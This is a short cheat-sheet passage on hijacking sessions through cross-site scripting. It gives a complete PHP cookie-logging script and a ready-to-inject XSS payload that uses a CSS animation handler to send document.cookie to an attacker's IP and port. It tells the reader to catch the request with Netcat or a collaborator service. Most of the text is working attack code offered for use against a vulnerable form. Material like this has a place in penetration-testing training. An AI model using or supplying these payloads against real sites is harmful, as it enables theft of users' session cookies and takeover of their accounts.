If an application is vulnerable to XSS, an attacker can leverage this vulnerability to obtain valid session identifiers (such as session cookies).

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)

First we have to create a cookie logging script.
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
```
This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.

Next we will start a Netcat listener, alternatively we can also use Burp Collaborator or [interactsh](https://github.com/projectdiscovery/interactsh). Then we will use the following payload and inject it on the XSS-vulnerable form.
```txt
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://OUR_IP:OUR_PORT/log.php?c=' + document.cookie;"></video>
```

Wait for our listener to receive the request and see the session IDs appended on the request.